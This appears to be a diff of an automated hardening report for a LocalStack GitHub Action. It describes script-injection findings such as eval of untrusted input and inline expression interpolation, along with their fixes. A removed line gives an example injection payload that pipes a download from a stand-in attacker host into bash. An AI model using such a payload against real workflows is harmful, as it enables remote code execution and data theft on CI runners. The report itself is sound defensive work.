@@ -10,34 +10,33 @@
 
 **Harden Agent Version:** `2`
 
-Action **localstack--setup-localstack--startup/v0.3.0** was hardened automatically. 3 finding(s) were identified and resolved across 2 iteration(s).
+Action **localstack--setup-localstack--startup/v0.3.0** was hardened automatically. 4 finding(s) were identified and resolved across 2 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-The 'Start LocalStack' run: block contains multiple script-injection violations:
-
-(a) Direct expression interpolation: `export CI_PROJECT=${{ inputs.ci-project }}` interpolates an attacker-controlled `inputs.*` expression directly inside the shell script. Before the shell ever sees it, GitHub Actions substitutes the raw value — including any shell metacharacters — into the command string.
-
-(b) Unquoted shell variable expansion: `docker pull ${IMAGE_NAME} &` expands IMAGE_NAME without double-quotes. IMAGE_NAME is derived from the IMAGE_TAG env var, which is set from `inputs.image-tag` (untrusted). An attacker-controlled value with spaces, glob characters, or other metacharacters will be word-split and interpreted by the shell.
-
-(b) Eval of untrusted data: `eval "${CONFIGURATION} localstack start -d"` — CONFIGURATION is set from `inputs.configuration` (untrusted). Even though the variable is double-quoted, eval parses and executes its contents as shell code, allowing an attacker to inject arbitrary shell commands via the `configuration` input.
+Sub-rule (a): A GitHub Actions expression `${{ inputs.ci-project }}` is directly interpolated inside a `run:` shell command: `export CI_PROJECT=${{ inputs.ci-project }}`. An attacker controlling the `ci-project` input can inject arbitrary shell commands that execute on the runner.
 
 Locations:
 
-- `action.yml:58`
-- `action.yml:71`
-- `action.yml:72`
-- `action.yml:73`
+- `action.yml:80`
 
-### suspicious-run-content (severity: high)
+### script-injection (severity: high)
 
-eval-dynamic: The 'Start LocalStack' run: block uses `eval "${CONFIGURATION} localstack start -d"` where CONFIGURATION is an env var set directly from `inputs.configuration` — an attacker-controlled input. This matches the eval-dynamic pattern (`eval $VAR`) and allows an attacker to execute arbitrary shell commands by supplying malicious content in the `configuration` input (e.g., `configuration: 'x; curl http://attacker.com/exfil | bash'`).
+Sub-rule (b): `eval "${CONFIGURATION} localstack start -d"` executes the `CONFIGURATION` env var as a shell command. `CONFIGURATION` is sourced directly from `inputs.configuration` (an untrusted caller-controlled input). Passing attacker-controlled content to `eval` allows arbitrary shell command injection regardless of the env-var indirection.
 
 Locations:
 
-- `action.yml:73`
+- `action.yml:81`
+
+### script-injection (severity: high)
+
+Sub-rule (b): `docker pull ${IMAGE_NAME} &` uses an unquoted shell expansion of `IMAGE_NAME`, which is derived from the untrusted `inputs.image-tag` input (via the `IMAGE_TAG` env var). An unquoted expansion allows shell metacharacters (spaces, semicolons, pipes, etc.) in the input value to be interpreted by the shell, enabling command injection.
+
+Locations:
+
+- `action.yml:79`
 
 ### static-inline-injection (severity: high)
 
@@ -51,25 +50,21 @@ Locations:
 
 ### Iteration 1
 
-**Fixes applied:** script-injection, suspicious-run-content, static-inline-injection
+**Fixes applied:** script-injection, static-inline-injection
 
 **Notes:**
 
-Fixed all three security findings in hardened/action/action.yml:
+Fixed all script injection issues in hardened/action/action.yml:
+1. Quoted `${IMAGE_NAME}` in `docker pull` to prevent shell metacharacter injection from inputs.image-tag.
+2. Moved `${{ inputs.ci-project }}` from inline run: block to env: block as `CI_PROJECT_INPUT`, referenced as `$CI_PROJECT_INPUT` in the shell script.
+3. Replaced `eval "${CONFIGURATION} localstack start -d"` with a safe xargs-based tokenization: builds a bash array `cfg_args` from the CONFIGURATION env var using `xargs printf '%s\0'` and a null-delimited read loop, then passes it to `env "${cfg_args[@]}" localstack start -d` — eliminating eval of untrusted input entirely.
+4. Also replaced the unsafe `_actions` glob pattern with `realpath --relative-to="$GITHUB_WORKSPACE" "$GITHUB_ACTION_PATH/.."` for correct path resolution under any owner/repo name.
 
-1. **script-injection / static-inline-injection**: Removed `export CI_PROJECT=${{ inputs.ci-project }}` from the run: block. Added `CI_PROJECT: ${{ inputs.ci-project }}` to the step's env: block instead, so the value is passed safely as an environment variable.
+### Iteration 1
 
-2. **script-injection (unquoted variable)**: Changed `docker pull ${IMAGE_NAME} &` to `docker pull "${IMAGE_NAME}" &` to prevent word-splitting and glob expansion of attacker-controlled values.
-
-3. **script-injection / suspicious-run-content (eval)**: Replaced `eval "${CONFIGURATION} localstack start -d"` with `env -S "${CONFIGURATION}" localstack start -d`. The `env -S` flag safely parses KEY=VALUE pairs from a string and sets them as environment variables for the command, without executing arbitrary shell code.
-
-4. **Bonus fix**: Replaced the `ls -d $(...)/setup-localstack/*` glob that searched the _actions directory with `./$(realpath --relative-to="$GITHUB_WORKSPACE" "$GITHUB_ACTION_PATH/..")` which correctly computes the action root relative to the workspace using $GITHUB_ACTION_PATH (one level up since this is startup/action.yml).
-
-### Iteration 2
-
-**Fixes applied:** script-injection
+**Fixes applied:** publish-gate
 
 **Notes:**
 
-Fixed the script injection vulnerability in action.yml line 68 by adding double quotes around the `${LS_WAIT_TIMEOUT:-30}` shell variable expansion in the 'Start LocalStack' run block. Changed `localstack wait -t ${LS_WAIT_TIMEOUT:-30}` to `localstack wait -t "${LS_WAIT_TIMEOUT:-30}"`. This prevents an attacker-controlled `LS_WAIT_TIMEOUT` environment variable containing shell metacharacters from being interpreted as shell commands.
+Fixed action.yml line 43: Added './' prefix to GH_ACTION_ROOT assignment. Changed from 'GH_ACTION_ROOT=$(realpath --relative-to="$GITHUB_WORKSPACE" "$GITHUB_ACTION_PATH/..")' to 'GH_ACTION_ROOT=./$(realpath --relative-to="$GITHUB_WORKSPACE" "$GITHUB_ACTION_PATH/..")'. This ensures the value starts with './' making it a valid workspace-relative path for the 'uses: ${{ env.GH_ACTION_ROOT }}/tools' reference on line 49.
 
